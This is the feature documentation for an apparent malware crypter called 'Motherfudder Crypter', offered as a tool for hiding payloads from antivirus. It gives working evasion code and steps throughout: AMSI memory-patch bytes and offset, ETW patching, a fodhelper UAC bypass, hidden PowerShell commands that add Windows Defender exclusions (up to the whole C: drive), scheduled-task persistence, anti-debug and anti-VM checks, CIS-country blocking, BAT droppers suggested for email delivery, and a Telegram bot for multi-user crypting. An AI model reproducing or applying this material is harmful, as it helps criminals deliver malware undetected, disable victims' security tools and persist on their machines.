# Feature Documentation

Comprehensive documentation of all features available in Motherfudder Crypter.

---

## Table of Contents

1. [Anti-Analysis Features•(#anti-analysis-features)
2. [Privilege Escalation•(#privilege-escalation)
3. [AV Evasion•(#av-evasion)
4. [Persistence Mechanisms•(#persistence-mechanisms)
5. [Instance Management•(#instance-management)
6. [Output Formats•(#output-formats)
7. [Interface Modes•(#interface-modes)

---

## Anti-Analysis Features

### Anti-Debug

**Purpose**: Detects and prevents debugging attempts

**Implementation**:
- Thread-based debugger detection
- Continuous monitoring loop
- Immediate termination upon detection

**Technical Details**:
```csharp
// Checks for managed debugger
if (System.Diagnostics.Debugger.IsAttached)
    CrashExit();

// Monitors for debuggers in background thread
while (true) {
    if (IsDebuggerPresent()) CrashExit();
    Thread.Sleep(1000);
}
```

**When to Use**:
- Production deployments
- Preventing reverse engineering
- Protecting payload integrity

**Detection Methods**:
- Managed debugger detection (`System.Diagnostics.Debugger`)
- Native debugger detection (`IsDebuggerPresent`)
- Continuous polling

**Configuration**:
```json
{
    "anti_debug": true
}
```

---

### Anti-VM

**Purpose**: Detects virtual machine environments and exits

**Implementation**:
- Hardware fingerprinting
- CPU instruction checks
- Firmware checks

**Technical Details**:
- Checks for VM-specific artifacts
- CPUID instruction analysis
- BIOS/firmware vendor detection

**When to Use**:
- Avoiding sandbox analysis
- Preventing automated analysis
- Targeting physical machines only

**Configuration**:
```json
{
    "anti_virtual_machine": true
}
```

---

### Geographic Restrictions

**Purpose**: Prevents execution in specific geographic regions

**Implementation**:
- Timezone-based detection
- CIS country blocking
- Immediate termination upon detection

**Technical Details**:
```csharp
// Blocked timezones (CIS countries)
int• blockedTimezones = { 5, 7, 29, 130, 137, 152, 203, 228, 238, 247 };
if (blockedTimezones.Contains(CurrentTimezone))
    CrashExit();
```

**When to Use**:
- Limiting operational scope
- Compliance requirements
- Targeting specific regions

**Configuration**:
```json
{
    "blacklist_cis_countries": true
}
```

---

## Privilege Escalation

### UAC Bypass

**Purpose**: Elevates privileges without user interaction

**Technique**: fodhelper.exe registry hijacking

**How It Works**:

1. Creates custom registry class under `HKCU\Software\Classes`
2. Sets command execution via `Shell\Open\command`
3. Hijacks `ms-settings\CurVer` to point to custom class
4. Launches fodhelper.exe (auto-elevates)
5. Cleans up registry artifacts

**Technical Flow**:
```
Non-elevated process
    •
Create HKCU\Software\Classes\<Random>\Shell\Open\command
    •
Set value: conhost.exe --headless <command>
    •
Point ms-settings\CurVer to <Random>
    •
Execute fodhelper.exe
    •
fodhelper auto-elevates and executes our command
    •
Cleanup registry entries
```

**Requirements**:
- User must be in Administrators group
- UAC must be enabled
- Windows 10/11

**Configuration**:
```json
{
    "uac_bypass": true
}
```

**See Also**: [UAC_BYPASS_INFO.md•(MfBuilder/UAC_BYPASS_INFO.md)

---

## AV Evasion

### AMSI Bypass (.NET Only)

**Purpose**: Bypasses Windows Antimalware Scan Interface

**Technique**: Memory patching at offset +33

**How It Works**:

1. Loads amsi.dll
2. Locates AmsiScanBuffer function
3. Calculates target address (base + 33 bytes)
4. Changes memory protection to RWX
5. Writes 3-byte patch: `xor rbx, rbx` (0x48 0x31 0xDB)
6. Restores memory protection to RX

**Technical Details**:
```csharp
IntPtr targetAddress = AmsiScanBufferAddress + 33;
byte• patch = { 0x48, 0x31, 0xDB }; // xor rbx, rbx

// Apply patch
VirtualProtect(targetAddress, 3, PAGE_EXECUTE_READWRITE);
Marshal.Copy(patch, 0, targetAddress, 3);
VirtualProtect(targetAddress, 3, PAGE_EXECUTE_READ);
```

**Why Offset +33**:
- Avoids function prologue
- Less likely to be detected
- Mimics natural instruction
- Minimal footprint

**Result**: AmsiScanBuffer always returns `AMSI_RESULT_CLEAN`

**Applies To**: .NET payloads only (native payloads use syscalls)

**Configuration**: Automatically enabled for .NET builds

**See Also**: [Chainski/GlobalAMSIBypass•(https://github.com/Chainski/GlobalAMSIBypass)

---

### ETW Patching (.NET Only)

**Purpose**: Disables Event Tracing for Windows

**How It Works**:
- Patches ETW event writing functions
- Prevents telemetry collection
- Stops behavioral analysis

**Applies To**: .NET payloads only

**Configuration**: Automatically enabled for .NET builds

---

### CLR String Obfuscation (.NET Only)

**Purpose**: Hides strings in .NET assemblies

**Techniques**:
- String encryption
- String splitting
- Proxy method generation

**Applies To**: .NET payloads during obfuscation phase

---

### Windows Defender Exclusion

**Purpose**: Adds executable to Windows Defender exclusion list

**How It Works**:

1. Gets current executable path
2. Executes PowerShell commands via hidden process
3. Adds path exclusion: `Add-MpPreference -ExclusionPath`
4. Adds process exclusion: `Add-MpPreference -ExclusionProcess`
5. Fails silently if unsuccessful

**Silent Mode** (with UAC Bypass):
- UAC bypass elevates to admin
- Defender exclusions added with admin rights
- No user prompts or visible windows
- Completely transparent operation

**Technical Details**:
```csharp
// Path exclusion
Add-MpPreference -ExclusionPath 'C:\Path\To\Executable\Directory'

// Process exclusion
Add-MpPreference -ExclusionProcess 'Executable.exe'
```

**PowerShell Execution**:
```csharp
ProcessStartInfo psi = new ProcessStartInfo {
    FileName = "powershell.exe",
    Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"...\"",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden
};
```

**When to Use**:
- Maximum stealth operation
- Long-term deployments
- Combined with UAC bypass for silent operation

**Configuration**:
```json
{
    "defender_exclusion": true,
    "uac_bypass": true  // Recommended for silent operation
}
```

**See Also**: [DEFENDER_EXCLUSION_INFO.md•(MfBuilder/DEFENDER_EXCLUSION_INFO.md)

---

## Persistence Mechanisms

### Auto-Start on Boot

**Purpose**: Ensures execution after system restart

**Implementation**: Scheduled task creation

**How It Works**:

1. Creates scheduled task XML template
2. Uses `schtasks.exe` to register task
3. Triggers on user login
4. Two modes: user-level and admin-level

**Technical Details**:

**User-Level Persistence**:
```xml
<RegistrationInfo>
    <URI>\<RandomTaskName></URI>
</RegistrationInfo>
<Triggers>
    <LogonTrigger>
        <Enabled>true</Enabled>
    </LogonTrigger>
</Triggers>
```

**Admin-Level Persistence** (with UAC bypass):
- System-level scheduled task
- Runs with highest privileges
- Survives user account changes

**Configuration**:
```json
{
    "run_on_startup": true
}
```

---

## Instance Management

### Single Instance

**Purpose**: Prevents multiple simultaneous executions

**Implementation**: Named mutex

**How It Works**:

1. Attempts to create global mutex with random name
2. If mutex exists, terminates immediately
3. Holds mutex for process lifetime
4. Releases on exit

**Technical Details**:
```csharp
Mutex mutex = new Mutex(true, "Global\\<RandomGUID>", out bool createdNew);
if (!createdNew)
    Environment.Exit(0);
```

**When to Use**:
- Preventing conflicts
- Resource management
- Avoiding detection via multiple instances

**Configuration**:
```json
{
    "single_instance": true
}
```

---

## Output Formats

### BAT Format

**Purpose**: Batch file wrapper with embedded executable

**Advantages**:
- More evasive
- Less scrutinized by AV
- Self-extracting
- Can include pre-execution commands

**Implementation**:
- Embedded base64-encoded executable
- PowerShell decoder
- Automatic cleanup

**When to Use**:
- Maximum evasion
- Email/document delivery
- Legacy system compatibility

**Configuration**:
```json
{
    "file_extension": "BAT"
}
```

---

### EXE Format

**Purpose**: Direct executable output

**Advantages**:
- Cleaner execution
- Smaller file size
- No PowerShell dependency
- Simpler deployment

**When to Use**:
- Direct execution
- Known-safe environments
- Performance-critical scenarios

**Configuration**:
```json
{
    "file_extension": "EXE"
}
```

---

## Interface Modes

### CLI Mode

**Purpose**: Traditional command-line interface with JSON configuration

**Features**:
- Batch processing support
- Scriptable builds
- Offline operation
- Repeatable configurations

**Usage**:
```bash
# Configure
nano build.json

# Add payload
cp target.exe payload.exe

# Build
./MfBuilder

# Output: out.bat or out.exe
```

**When to Use**:
- Automated builds
- CI/CD integration
- Offline environments
- Scripted workflows

---

### Telegram Bot Mode

**Purpose**: Interactive configuration via Telegram

**Features**:
- Key-based authentication
- Real-time configuration
- Binary type auto-detection
- File upload/download
- Multi-user support
- Session management

**Workflow**:
```
1. User sends /start
2. Bot requests authentication key
3. User authenticates
4. Bot asks: "Do you want to crypt a binary•"
5. User uploads .exe file
6. Bot detects binary type (Native/NET, x86/x64)
7. Bot displays configuration menu
8. User toggles options (1-7)
9. User sends "build"
10. Bot builds and returns crypted file
```

**Configuration Menu**:
```
 Crypter Configuration

1. Anti Debug: • OFF
2. Anti VM: • OFF
3. Blacklist CIS Countries: • OFF
4. UAC Bypass: • OFF
5. Single Instance: • OFF
6. Persistence: • OFF
7. Windows Defender Exclusion: • OFF
8. Output Format: BAT

Send number to toggle, 'format' to change output, 'build' when ready
```

**When to Use**:
- Remote operation
- Multiple users
- Quick testing
- Non-technical users
- Interactive configuration

**Setup**:
1. Obtain bot token from @BotFather
2. Configure `.env` with `TELOXIDE_TOKEN`
3. Set authentication key in `src/telegram_bot.rs`
4. Run with `--bot` flag

**See Also**: [BOT_SETUP.md•(MfBuilder/BOT_SETUP.md)

---

## Feature Compatibility Matrix

| Feature | Native x86 | Native x64 | .NET x86 | .NET x64 |
|---------|-----------|-----------|----------|----------|
| Anti-Debug | • | • | • | • |
| Anti-VM | • | • | • | • |
| Blacklist CIS | • | • | • | • |
| UAC Bypass | • | • | • | • |
| Single Instance | • | • | • | • |
| Persistence | • | • | • | • |
| Defender Exclusion | • | • | • | • |
| AMSI Bypass | • | • | • | • |
| ETW Patching | • | • | • | • |
| CLR Obfuscation | • | • | • | • |
| Indirect Syscalls | • | • | • | • |

---

## Recommended Configurations

### Maximum Stealth

```json
{
    "file_extension": "BAT",
    "anti_debug": true,
    "anti_virtual_machine": true,
    "blacklist_cis_countries": false,
    "uac_bypass": true,
    "single_instance": true,
    "run_on_startup": true,
    "defender_exclusion": true,
    "binder": false
}
```

**Result**:
- Silent UAC elevation
- Silent Defender exclusion
- Persistent across reboots
- Protected from analysis
- Maximum evasion

---

### Development/Testing

```json
{
    "file_extension": "EXE",
    "anti_debug": false,
    "anti_virtual_machine": false,
    "blacklist_cis_countries": false,
    "uac_bypass": false,
    "single_instance": false,
    "run_on_startup": false,
    "defender_exclusion": false,
    "binder": false
}
```

**Result**:
- Easy debugging
- VM compatible
- No persistence
- Clean testing

---

### Targeted Deployment

```json
{
    "file_extension": "EXE",
    "anti_debug": true,
    "anti_virtual_machine": false,
    "blacklist_cis_countries": true,
    "uac_bypass": true,
    "single_instance": true,
    "run_on_startup": false,
    "defender_exclusion": true,
    "binder": false
}
```

**Result**:
- Geographic restriction
- Silent privilege escalation
- Defender bypass
- One-time execution

---

## What This Crypter Does NOT Include

For transparency and to set proper expectations:

### Not Implemented

#### Process Hollowing
- • No process hollowing (RunPE) techniques
- • No legitimate process spawning for injection

**Why**: Process hollowing is easily detected by modern EDR solutions and adds significant complexity.

**Instead**: Direct assembly loading (.NET) or indirect syscalls (native)

#### Process Injection
- • No remote process injection
- • No DLL injection into existing processes
- • No reflective DLL loading
- • No thread hijacking
- • No APC queue injection

**Why**: Injection techniques trigger behavioral detection and are high-risk.

**Instead**: Standalone execution with evasion features (AMSI bypass, Defender exclusions)

#### Advanced Obfuscation
- • No control flow flattening
- • No virtualization obfuscation
- • No polymorphic code generation

**Why**: These techniques significantly increase file size and can degrade performance.

**Instead**: String encryption, method obfuscation, API hashing

### What It Uses Instead

#### For .NET Payloads
- • Assembly.Load() with decryption
- • AMSI bypass (memory patching)
- • ETW patching (event blocking)
- • String encryption
- • Method renaming
- • Defender exclusions

#### For Native Payloads
- • Indirect syscalls (no IAT entries)
- • Manual module loading
- • API hashing
- • Shellcode execution
- • Defender exclusions

### Comparison with Other Crypters

**vs. Process Injection Crypters**:

| Feature | This Crypter | Injection Crypters |
|---------|-------------|-------------------|
| EDR Detection Risk | Lower | Higher |
| Complexity | Moderate | High |
| Stability | Excellent | Variable |
| User Detection | Lower | Higher |
| AV Detection | Lower | Variable |

**vs. Process Hollowing Crypters**:

| Feature | This Crypter | Hollowing Crypters |
|---------|-------------|-------------------|
| Process Creation | Minimal | Spawns legitimate process |
| Memory Artifacts | Fewer | More suspicious |
| Detection Risk | Lower | Moderate-High |
| Implementation | Simpler | Complex |

### Recommendation

**When to use this crypter**:
- • Need reliable, stable operation
- • Want lower EDR detection risk
- • Prefer simplicity over complexity
- • Focus on AV evasion rather than process hiding
- • Silent Defender exclusions are priority

**When you might need alternatives**:
- Need process injection for specific use case
- Require hiding within legitimate processes
- Target environment with no Defender (other AV)
- Need polymorphic capabilities

### C:\ Drive Exclusion (Aggressive Option)

**Purpose**: Excludes entire C: drive from Windows Defender scanning

**How It Works**:
```powershell
Add-MpPreference -ExclusionPath 'C:\'
```

**Result**: Windows Defender will not scan ANY files on the C: drive.

**Effectiveness**: • (Maximum)  
**Stealth**:  (Highly Suspicious)  
**Detection Risk**:  (Very High)

**When to Use**:
- • Testing on your own systems
- • Controlled lab environments
- • Short-term operations
- • **NOT** for stealth operations
- • **NOT** in enterprise environments
- • **NOT** for long-term deployments

**Detection Indicators**:
- Event ID 5007 (Defender settings changed)
- Visible in Windows Security settings
- GPO may override/alert
- SOC/SIEM will likely detect
- Unusual behavior flagged by EDR

**Configuration**:
```json
{
    "defender_exclusion": true,
    "defender_exclude_drive": true,  // Extreme mode
    "uac_bypass": true  // Required for silent operation
}
```

**Bot Configuration**:
- Option #7: Windows Defender Exclusion
- Option #8: Exclude C:\ Drive 
- Shows " AGGRESSIVE!" when enabled

**Recommendation**: Only use for testing or in environments where detection is acceptable. For operational use, standard defender exclusion (directory + process) is sufficient and far less suspicious.

---

### Best Practices

As noted in similar crypter FAQs:

> **AntiVM Usage**: Use when you don't need to run in virtual environments or RDP. Disable for testing in VMs.

> **Injection vs. This Crypter**: Use injection-based crypters if user detection (Task Manager visibility) is a greater concern than AV/EDR detection. This crypter prioritizes AV evasion.

> **Persistence**: If your payload has its own startup mechanism, don't enable both. Use one or the other to avoid conflicts.

> **Defender Exclusions**: When combined with UAC bypass, provides silent operation - one of the strongest features of this crypter.

---

## See Also

- [README.md•(README.md) - Project overview
- [INSTALLATION.md•(MfBuilder/INSTALLATION.md) - Installation guide
- [QUICKSTART.md•(MfBuilder/QUICKSTART.md) - Quick start guide
- [BOT_SETUP.md•(MfBuilder/BOT_SETUP.md) - Telegram bot setup
- [UAC_BYPASS_INFO.md•(MfBuilder/UAC_BYPASS_INFO.md) - UAC bypass details
- [DEFENDER_EXCLUSION_INFO.md•(MfBuilder/DEFENDER_EXCLUSION_INFO.md) - Defender exclusion guide
